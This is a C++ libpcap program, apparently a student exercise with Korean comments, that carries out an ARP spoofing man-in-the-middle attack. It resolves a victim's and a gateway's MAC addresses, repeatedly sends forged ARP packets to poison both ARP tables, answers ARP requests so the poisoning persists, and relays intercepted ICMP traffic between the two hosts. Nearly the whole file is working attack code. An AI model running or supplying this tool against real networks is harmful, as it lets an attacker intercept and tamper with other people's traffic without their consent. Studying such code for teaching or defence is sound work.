#include <cstdio>
#include <pcap.h>
#include "custom.h"
#include <iostream>

Param param  = {
	.dev_ = NULL
};

int main(int argc, char* argv[]) {	
	if (!parse(&param, argc, argv))
		return -1;

	//Attacker Ip & Mac 가져오기
    Ip attacker_Ip = myIp(argv[1]);
	Mac attacker_Mac = myMac(argv[1]);
	printf("attacker_Ip : %s\n", ((std::string)attacker_Ip).c_str());
	printf("attacker_Mac : %s\n", ((std::string)attacker_Mac).c_str());

	char errbuf[PCAP_ERRBUF_SIZE];	
	
	pcap_t* handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
		return -1;
	}

	// Sender & Target Get IP
	Ip sender_Ip = Ip(argv[2]);	 //victim_Mac
	Ip target_Ip = Ip(argv[3]); //gateway_Mac
	printf("sender_Ip : %s\n", ((std::string)sender_Ip).c_str());
	printf("target_Ip : %s\n", ((std::string)target_Ip).c_str());
	
	// Sender & Target Get Mac
	Mac sender_Mac;
	Mac target_Mac;
	Mac boardcast_Mac = Mac::broadcastMac();
	
	// Sender Mac 확인
	sendArp(handle, attacker_Ip, sender_Ip, attacker_Mac, boardcast_Mac, ArpHdr::Request);
	sender_Mac = getMac(handle, sender_Ip, attacker_Ip, attacker_Mac);	 			 // victim_Mac
	printf("sender_Mac : %s\n", ((std::string)sender_Mac).c_str());

	// Sender Mac 확인	
	sendArp(handle, attacker_Ip, target_Ip, attacker_Mac, boardcast_Mac, ArpHdr::Request);
	target_Mac = getMac(handle, target_Ip, attacker_Ip, attacker_Mac);	 			 // victim_Mac
	printf("target_Mac : %s\n", ((std::string)target_Mac).c_str());
	
	struct pcap_pkthdr* header;
	const u_char* packet;
	int check = 0;
	int res = 0;

	while (true) {
		// Arp Spoofing Attack 
		if (check % 100 == 0 ){	// (지속적인 변조 시도)
			sendArp(handle, target_Ip, sender_Ip, attacker_Mac, sender_Mac, ArpHdr::Request); // sender table 변조
			sendArp(handle, sender_Ip, target_Ip, attacker_Mac, target_Mac, ArpHdr::Request); // target table 변조
			printf("Arp Spoofing Attack Success\n");
		}
		check++;
	
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		EthHdr* eth = (EthHdr*)(packet);
		
		if (eth->type() == EthHdr::Arp){ 	//ARP 변조 복구 방지 REPLY 구현
			ArpHdr* arp = (ArpHdr*)(packet+sizeof(EthHdr));

			if (arp->op() != ArpHdr::Request) continue;

			if (eth->dmac() == attacker_Mac){
				printf("ARP 변조 복구 방지 REPLY\n");
				Ip sip = arp->tip();
				Ip dip = arp->sip();
				Mac smac = arp->tmac();
				Mac dmac = arp->smac();
				sendArp(handle, sip, dip, smac, dmac, ArpHdr::Reply);
			}
		}else if(eth->type() == EthHdr::Ip4){ 	//ICMP REPLY 구현
			IpHdr* ip = (IpHdr*)(packet+sizeof(EthHdr));
			IcmpHdr *icmp = (IcmpHdr*)(packet+sizeof(EthHdr)+ip->ihl()*4);

			if (ip->ptl() != IpHdr::ICMP) continue;
		
			//Icmp Request Relay (sender -> attacker, attacker -> target)
			if (eth->dmac() == attacker_Mac && icmp->type() == IcmpHdr::ECHO_REQUEST){
				printf("Icmp Request Relay (sender -> attacker, attacker -> target)\n");
				eth->setDmac(target_Mac);
				eth->setSmac(attacker_Mac);

				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthHdr)+ip->tl());
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}else if (eth->dmac() == attacker_Mac && icmp->type() == IcmpHdr::ECHO_REPLAY){	//Icmp Request Relay (target -> attacker, attacker -> sender)
				printf("Icmp Request Relay (target -> attacker, attacker -> sender)\n");
				eth->setDmac(sender_Mac);
				eth->setSmac(attacker_Mac);

				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthHdr)+ip->tl());
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}
		}
	}
	pcap_close(handle);
}